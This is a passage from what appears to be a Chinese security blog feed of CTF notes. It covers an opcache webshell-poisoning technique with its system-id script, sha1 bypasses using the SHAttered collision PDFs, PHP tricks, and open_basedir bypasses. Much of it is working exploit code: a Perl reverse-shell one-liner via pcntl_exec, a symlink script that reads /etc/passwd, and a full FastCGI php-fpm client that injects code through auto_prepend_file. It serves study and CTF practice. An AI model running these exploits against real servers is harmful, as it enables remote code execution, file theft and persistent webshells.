检测木马、病毒、恶意软件和其他恶意威胁的开源防病毒引擎

windows常用命令


命令
说明



regedit
注册表


taskmgr
任务管理器


msconfig
系统配置


eventvwr
事件查看器


compmgmt.msc
计算机管理


gpedit.msc
本地组策略


taskschd.msc
计划任务


lusrmgr.msc
本地用户和组


查看网络连接netstat -ano
操作系统的详细配置信息systeminfo
获取系统进程信息wmic process
根据应用程序查找PIDwmic process where name=&quot;cmd.exe&quot; get processid,executablepath,name
根据PID查找应用程序wmic process where processid=&quot;9096&quot; get executablepath,name
获取系统进程信息tasklist
对于要查询特定dll的调用情况，可以使用tasklist /d dll名称
计算样本MD5certutil -hashfile %样本exe% md5
]]></content>
      <categories>
        <category>hw</category>
      </categories>
      <tags>
        <tag>hw</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>opcache缓存利用</title>
    <url>/posts/3b0128e6/</url>
    <content><![CDATA[什么是opcacheopencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用）
项目github地址
一：opcache缓存+文件包含靶机：lewiserii/php7-opcache-include
例题：
&lt;?phperror_reporting(0);//I heard you are good at PHPINFO+LFI, flag is in flag.php, find it my dear noob vegetable hacker.if ( isset($_GET[&#x27;file&#x27;]) ) &#123;    $file = $_GET[&#x27;file&#x27;];    if ( $file === &quot;phpinfo&quot; ) &#123;        phpinfo();        exit;    &#125;    if ( preg_match(&#x27;/proc/i&#x27; , $file) ) &#123;        die(&quot;private&quot;);    &#125;    $file = &quot;/var/www/html/&quot; . $file;    $content = file_get_contents($file);    if ( !$content ) &#123;        die(&quot;nothing&quot;);    &#125;    if ( preg_match(&quot;/script|&lt;\?/i&quot;, $content) ) &#123;        die(&quot;bypass me&quot;);    &#125;    include_once $file;&#125; else &#123;    highlight_file(__FILE__);&#125;

看下opcache的状态是开启还是关闭的

从上图可以得出结论，在/var/www/cache/下存在着PHP的缓存文件，其完整的绝对路径是/var/www/cache/[一个 md5]/var/www/html/flag.php.bin
如果要包含文件的话就要知道路径中的md5值，查阅资料可知，这个md5被称为 system id,它的计算算法是固定的，由php版本号、zend extension id、Zend Bin ID，这三样拼接起来md5即可，而这3种东西正好全都在phpinfo里可以拿到，可以使用该脚本一键计算：
#!/usr/bin/env python2# Copyright (c) 2016, 2019 GoSecure Inc.import sysfrom packaging import versionimport reimport requestsdef md5(data):    if type(data) is str:        data = bytes(data, encoding=&#x27;utf-8&#x27;)    return __import__(&#x27;hashlib&#x27;).md5(data).hexdigest()if len(sys.argv) != 2:    print(sys.argv[0] + &quot; [file|URL]&quot;)    exit(0)if (sys.argv[1].startswith(&quot;http&quot;)):    text = requests.get(sys.argv[1]).textelse:    with open(sys.argv[1]) as file:        text = file.read()        file.close()# PHP Versionphp_version = re.search(&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP Version &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;, text)if php_version == None:    php_version = re.search(&#x27;&lt;h1 class=&quot;p&quot;&gt;PHP Version (.*)&#x27;, text)if php_version == None:    print(&quot;No PHP version found, is this a phpinfo file?&quot;)    exit(0)php_version = php_version.group(1)php_greater_74 = (version.parse(&quot;7.4.0&quot;) &lt; version.parse(php_version.split(&quot;-&quot;)[0]))# Zend Extension Build IDzend_extension_id = re.search(&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Zend Extension Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;, text)if zend_extension_id == None:    print(&quot;No Zend Extension Build found.&quot;)    exit(0)zend_extension_id = zend_extension_id.group(1)# Architecturearchitecture = re.search(&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;System &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;, text)if architecture == None:    print(&quot;No System info found.&quot;)    exit(0)architecture = architecture.group(1).split()[-1]# Zend Bin ID suffixif architecture == &quot;x86_64&quot;:    bin_id_suffix = &quot;48888&quot;else:    bin_id_suffix = &quot;44444&quot;# With PHP 7.4 they fixed the undefined macro that did the weird bin IDif php_greater_74:    zend_bin_id = &quot;BIN_&quot; + bin_id_suffixelse:    zend_bin_id = &quot;BIN_SIZEOF_CHAR&quot; + bin_id_suffix# Alternate Bin ID, see #5if not php_greater_74:    if architecture == &quot;x86_64&quot;:        alt_bin_id_suffix = &quot;148888&quot;    else:        alt_bin_id_suffix = &quot;144444&quot;    alt_zend_bin_id = &quot;BIN_&quot; + alt_bin_id_suffix# Loggingprint(&quot;PHP version : &quot; + php_version)print(&quot;Zend Extension ID : &quot; + zend_extension_id)print(&quot;Zend Bin ID : &quot; + zend_bin_id)print(&quot;Assuming &quot; + architecture + &quot; architecture&quot;)digest = md5(php_version + zend_extension_id + zend_bin_id)print(&quot;------------&quot;)print(&quot;System ID : &quot; + digest)if not php_greater_74:    alt_digest = md5(php_version + zend_extension_id + alt_zend_bin_id)    print(&quot;PHP lower than 7.4 detected, an alternate Bin ID is possible:&quot;)    print(&quot;Alternate Zend Bin ID : &quot; + alt_zend_bin_id)    print(&quot;Alternate System ID : &quot; + alt_digest)

得到System ID : 0b8bd94e9858e5d32d058dc0acf75014

包含flag.php.bin即可

二：opcache缓存+文件上传靶机：lewiserii/php7-opcache-upload    &#x2F;&#x2F;关闭时间戳验证
首页是个文件上传点，可以自定义上传目录，简单测试后发现/var/www/html目录没有权限
同时给了个phpinfo.php，查看opcache状态，发现是启用状态，直接跑脚本算system id
满足这几个条件就可以上传木马bin文件到缓存目录，覆盖后达到getshell的目的

得到缓存目录为/tmp/opcache/0b8bd94e9858e5d32d058dc0acf75014/var/www/html
本地搭建一个opcache环境，写上一句话木马，把生成的index.php.bin拿下来

将图中红框部分的本地system id替换成靶机算出来的system id

上传

再次访问index.php，发现内容已被覆盖

三：修复方式file_cache_only如果内存缓存方式的优先级高于文件缓存，那么重写后的 OPcache 文件（webshell）是不会被执行的。但是，当 Web 服务器重启后，就可以绕过此限制。因为，当服务器重启之后，内存中的缓存为空，此时，OPcache 会使用文件缓存的数据填充内存缓存的数据，这样，webshell 就可以被执行了。
validate_timestamp当opcache.validate_timestamps=1时，bin文件在创建时会在文件内容中写入一个时间戳，这个时间戳跟源文件一样，在执行bin文件之前php会检查时间戳是否一致，如果不一致则丢弃重新创建bin文件。

]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>sha1强比较绕过</title>
    <url>/posts/5da2ae7c/</url>
    <content><![CDATA[例1只判断两个值不能相等的情况
&lt;?phphighlight_file(__FILE__);error_reporting(0);if (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;]))&#123;    if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;])        echo &#x27;Your password can not be your name!&#x27;;    else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;]))      die(&#x27;welcome&#x27;);    else        echo &#x27;Invalid password.&#x27;;&#125;else    echo &#x27;Login first!&#x27;;?&gt;
可以使用数组来绕过这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回NULL，if 条件成立
例2既判断了两个值不能相等，又判断了是否为数组
&lt;?phphighlight_file(__FILE__);error_reporting(0);if (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;]))&#123;    if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;])        echo &#x27;Your password can not be your name!&#x27;;    else if(is_array($_GET[&#x27;name&#x27;]) || is_array($_GET[&#x27;password&#x27;]))        die(&#x27;There is no way you can sneak me, young man!&#x27;);    else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;]))&#123;      die(&#x27;yes&#x27;);    &#125;    else        echo &#x27;Invalid password.&#x27;;&#125;else    echo &#x27;Login first!&#x27;;?&gt;
这样只能找两个sha1值相等的找到google放出两个SHA1值相同而不一样(SHA256的值不通)的pdf文件具体分析shattered-1.pdf
%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
shattered-2.pdf
%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
满足所有条件
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>php</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>php_trick</title>
    <url>/posts/1ac6587f/</url>
    <content><![CDATA[记录php下的小技巧和特性
命令执行中断报错eval($cmd.&#x27;aaa&#x27;);

可以利用__halt_compiler();中断编译器的执行，不让eval报错
$cmd=&#39;system(&quot;whoami&quot;);__halt_compiler();&#39;;
preg_replace &#x2F;e 模式一部分修正符的含义
1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号4、/s 与/m相对，单行模式匹配。5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。6、/x 忽略空白模式。


preg_replace 使用了 &#x2F;e 模式，导致了代码可以被执行
&lt;?phpecho preg_replace(&quot;/aa/e&quot;,&quot;system(&#x27;whoami&#x27;);&quot;,&quot;aa&quot;);

注意：php5.5以上版本&#x2F;e被弃用
Error::getMessagePHP的内置类 Error::getMessage方法可以返回Error类实例化时接受的字符串
new Error(&quot;system&quot;)-&gt;getMessage就会返回system
例如
((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());((new Error(&#x27;system&#x27;))-&gt;getMessage())((new $Error(&#x27;ls&#x27;))-&gt;getMessage());


pcntl_exec反弹shellpcntl_exec(&#x27;/usr/bin/perl&#x27;,[&#x27;-e&#x27;,&#x27;use Socket;$i=&quot;ip&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;]);

php匿名类class@anonymous+chr(0)+php文件路径+:+行数$列数
例子
&lt;?phpif (isset($_GET[&#x27;ezphpPhp8&#x27;])) &#123;    highlight_file(__FILE__);&#125; else &#123;    die(&quot;No&quot;);&#125;$a = new class &#123;    function __construct()    &#123;    &#125;    function getflag()    &#123;        system(&#x27;cat /flag&#x27;);    &#125;&#125;;unset($a);$a = $_GET[&#x27;ezphpPhp8&#x27;];$f = new $a();$f-&gt;getflag();?&gt;//2024红明谷


直接构造class@anonymous%00/var/www/html/flag.php:7$0即可
或者直接echo urlencode(get_class($a));输出
REQUEST的优先级&lt;?phpfunction waf($str)&#123;    foreach ($str as $name =&gt; $value) &#123;        if(preg_match(&#x27;/[a-z]/i&#x27;, $value))&#123;            exit(&quot;waf&quot;);        &#125;    &#125;&#125;waf($_REQUEST);

会同时接收post和get，但优先接收post的参数
所以post发送同名参数后get可以绕过
一些替换localhost可以代替&#x2F;进行绕过
php函数小记implode() — 把数组元素组合为一个字符串]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>php</tag>
        <tag>trick</tag>
      </tags>
  </entry>
  <entry>
    <title>php绕过open_basedir</title>
    <url>/posts/3e5549a6/</url>
    <content><![CDATA[open_basedir一般用来限制跨目录读写文件
php绕过open_basedir是一个古老的漏洞，在2009年左右就被提出来了
glob:&#x2F;&#x2F;opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。
这里结合两个函数来列举根目录中的文件：
$a=&quot;glob:///*&quot;;if ( $b = opendir($a) ) &#123;    while ( ($file = readdir($b)) !== false ) &#123;        echo $file.&quot;&lt;br&gt;&quot;;    &#125;    closedir($b);&#125;

使用DirectoryIterator的效果是一样的
$c=&quot;glob:///*&quot;;$a = new DirectoryIterator($c);foreach($a as $f)&#123;    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;


局限性：不能列举出其他非根目录和open_basedir指定的目录中的文件
将glob:///*改为glob:///*/www/../*即可读取var目录
同样的glob:///*/www/*可以读取&#x2F;var&#x2F;www目录glob:///*/www/html/*读取&#x2F;var&#x2F;www&#x2F;html目录
chdir()与ini_set()组合这种利用方式跟open_basedir存在缺陷的处理逻辑有关
通过跳转和设置open_basedir实现绕过
mkdir(&#x27;1&#x27;);chdir(&#x27;1&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo file_get_contents(&#x27;/etc/passwd&#x27;);//var_dump(scandir(&#x27;/&#x27;));//readfile(&#x27;/flag&#x27;);




symlink()&lt;?phpmkdir(&quot;A&quot;);chdir(&quot;A&quot;);mkdir(&quot;B&quot;);chdir(&quot;B&quot;);mkdir(&quot;C&quot;);chdir(&quot;C&quot;);mkdir(&quot;D&quot;);chdir(&quot;D&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);symlink(&quot;A/B/C/D&quot;,&quot;xx&quot;);symlink(&quot;xx/../../../../etc/passwd&quot;,&quot;exp&quot;);unlink(&quot;xx&quot;);mkdir(&quot;xx&quot;);?&gt;

访问后会生成一个名为exp的文件，内容就是&#x2F;etc&#x2F;passwd
原理：创建一个链接文件xx，用相对路径指向A&#x2F;B&#x2F;C&#x2F;D，再创建一个链接文件exp指向xx&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd。其实指向的就是A&#x2F;B&#x2F;C&#x2F;D&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，其实就是&#x2F;etc&#x2F;passwd。这时候删除xx，再创建一个xx目录，但exp还是指向xx&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，所以就成功跨到&#x2F;etc&#x2F;passwd了。（需要跨越几层就创建几层目录）
p牛的脚本
&lt;?php/** by phithon* From https://www.leavesongs.com* detail: http://cxsecurity.com/issue/WLB-2009110068*/header(&#x27;content-type: text/plain&#x27;);error_reporting(-1);ini_set(&#x27;display_errors&#x27;, TRUE);printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#x27;open_basedir&#x27;), phpversion());printf(&quot;disable_functions: %s\n&quot;, ini_get(&#x27;disable_functions&#x27;));$file = str_replace(&#x27;\\&#x27;, &#x27;/&#x27;, isset($_REQUEST[&#x27;file&#x27;]) ? $_REQUEST[&#x27;file&#x27;] : &#x27;/etc/passwd&#x27;);$relat_file = getRelativePath(__FILE__, $file);$paths = explode(&#x27;/&#x27;, $file);$name = mt_rand() % 999;$exp = getRandStr();mkdir($name);chdir($name);for($i = 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;    mkdir($paths[$i]);    chdir($paths[$i]);&#125;mkdir($paths[$i]);for ($i -= 1; $i &gt; 0; $i--) &#123;     chdir(&#x27;..&#x27;);&#125;$paths = explode(&#x27;/&#x27;, $relat_file);$j = 0;for ($i = 0; $paths[$i] == &#x27;..&#x27;; $i++) &#123;     mkdir($name);    chdir($name);    $j++;&#125;for ($i = 0; $i &lt;= $j; $i++) &#123;     chdir(&#x27;..&#x27;);&#125;$tmp = array_fill(0, $j + 1, $name);symlink(implode(&#x27;/&#x27;, $tmp), &#x27;tmplink&#x27;);$tmp = array_fill(0, $j, &#x27;..&#x27;);symlink(&#x27;tmplink/&#x27; . implode(&#x27;/&#x27;, $tmp) . $file, $exp);unlink(&#x27;tmplink&#x27;);mkdir(&#x27;tmplink&#x27;);delfile($name);$exp = dirname($_SERVER[&#x27;SCRIPT_NAME&#x27;]) . &quot;/&#123;$exp&#125;&quot;;$exp = &quot;http://&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;&#123;$exp&#125;&quot;;echo &quot;\n-----------------content---------------\n\n&quot;;echo file_get_contents($exp);delfile(&#x27;tmplink&#x27;);function getRelativePath($from, $to) &#123;  // some compatibility fixes for Windows paths  $from = rtrim($from, &#x27;\/&#x27;) . &#x27;/&#x27;;  $from = str_replace(&#x27;\\&#x27;, &#x27;/&#x27;, $from);  $to   = str_replace(&#x27;\\&#x27;, &#x27;/&#x27;, $to);  $from   = explode(&#x27;/&#x27;, $from);  $to     = explode(&#x27;/&#x27;, $to);  $relPath  = $to;  foreach($from as $depth =&gt; $dir) &#123;    // find first non-matching dir    if($dir === $to[$depth]) &#123;      // ignore this directory      array_shift($relPath);    &#125; else &#123;      // get number of remaining dirs to $from      $remaining = count($from) - $depth;      if($remaining &gt; 1) &#123;        // add traversals up to first matching dir        $padLength = (count($relPath) + $remaining - 1) * -1;        $relPath = array_pad($relPath, $padLength, &#x27;..&#x27;);        break;      &#125; else &#123;        $relPath[0] = &#x27;./&#x27; . $relPath[0];      &#125;    &#125;  &#125;  return implode(&#x27;/&#x27;, $relPath);&#125;function delfile($deldir)&#123;    if (@is_file($deldir)) &#123;        @chmod($deldir,0777);        return @unlink($deldir);    &#125;else if(@is_dir($deldir))&#123;        if(($mydir = @opendir($deldir)) == NULL) return false;        while(false !== ($file = @readdir($mydir)))        &#123;            $name = File_Str($deldir.&#x27;/&#x27;.$file);            if(($file!=&#x27;.&#x27;) &amp;&amp; ($file!=&#x27;..&#x27;))&#123;delfile($name);&#125;        &#125;         @closedir($mydir);        @chmod($deldir,0777);        return @rmdir($deldir) ? true : false;    &#125;&#125;function File_Str($string)&#123;    return str_replace(&#x27;//&#x27;,&#x27;/&#x27;,str_replace(&#x27;\\&#x27;,&#x27;/&#x27;,$string));&#125;function getRandStr($length = 6) &#123;    $chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;    $randStr = &#x27;&#x27;;    for ($i = 0; $i &lt; $length; $i++) &#123;        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);    &#125;    return $randStr;&#125;

上传到服务器后GET传file=xxx即可实现绕过open_basedir来读取文件
php-fpm在攻击php-fpm的基础上对 open_basedir 进行重设(对于php-fpm的攻击原理我单独写了一篇总结)
&#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;+chr(0x0A)+&#39;open_basedir = /&#39;,
import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;)    else:        s = str(s)    return sclass FastCGIClient:    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;    # private    __FCGI_VERSION = 1    __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3    __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11    __FCGI_HEADER_SIZE = 8    # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3    def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()    def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        try:            self.sock.connect((self.host, int(self.port)))        except socket.error as msg:            self.sock.close()            self.sock = None            print(repr(msg))            return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \              + bchr(fcgi_type) \              + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \              + bchr(requestid &amp; 0xFF) \              + bchr((length &gt;&gt; 8) &amp; 0xFF) \              + bchr(length &amp; 0xFF) \              + bchr(0) \              + bchr(0) \              + content        return buf    def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b&#x27;&#x27;        if nLen &lt; 128:            record += bchr(nLen)        else:            record += bchr((nLen &gt;&gt; 24) | 0x80) \                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(nLen &amp; 0xFF)        if vLen &lt; 128:            record += bchr(vLen)        else:            record += bchr((vLen &gt;&gt; 24) | 0x80) \                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(vLen &amp; 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header = dict()        header[&#x27;version&#x27;] = bord(stream[0])        header[&#x27;type&#x27;] = bord(stream[1])        header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])        header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])        header[&#x27;paddingLength&#x27;] = bord(stream[6])        header[&#x27;reserved&#x27;] = bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record[&#x27;content&#x27;] = b&#x27;&#x27;            if &#x27;contentLength&#x27; in record.keys():                contentLength = int(record[&#x27;contentLength&#x27;])                record[&#x27;content&#x27;] += buffer.read(contentLength)            if &#x27;paddingLength&#x27; in record.keys():                skiped = buffer.read(int(record[&#x27;paddingLength&#x27;]))            return record    def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;):        if not self.__connect():            print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;)            return        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)        self.requests[requestId] = dict()        request = b&quot;&quot;        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b&#x27;&#x27;        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId)        self.sock.send(request)        self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND        self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;        return self.__waitForResponse(requestId)    def __waitForResponse(self, requestId):        data = b&#x27;&#x27;        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf        data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \                    or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:                if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response[&#x27;requestId&#x27;]):                    self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;]            if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId][&#x27;response&#x27;]    def __repr__(self):        return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;:    parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;)    parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;)    parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;)    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;)    parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int)    args = parser.parse_args()    client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = &quot;/&quot;    uri = args.file    content = args.code    params = &#123;        &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,        &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;,        &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;),        &#x27;SCRIPT_NAME&#x27;: uri,        &#x27;QUERY_STRING&#x27;: &#x27;&#x27;,        &#x27;REQUEST_URI&#x27;: uri,        &#x27;DOCUMENT_ROOT&#x27;: documentRoot,        &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,        &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,        &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;,        &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,        &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,        &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,        &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;,        &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;,        &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content),        &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;+chr(0x0A)+&#x27;open_basedir = /&#x27;,        &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;    &#125;    response = client.request(params, content)    print(force_text(response))

python fpm.py 192.168.100.131 -p 9000 /usr/share/nginx/html/index.php  -c &quot;&lt;?php var_dump(scandir(&#39;../&#39;)); exit();?&gt;&quot;

PHP绕过open_basedir列目录的研究
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>php</tag>
        <tag>bypass</tag>
        <tag>open_basedir</tag>
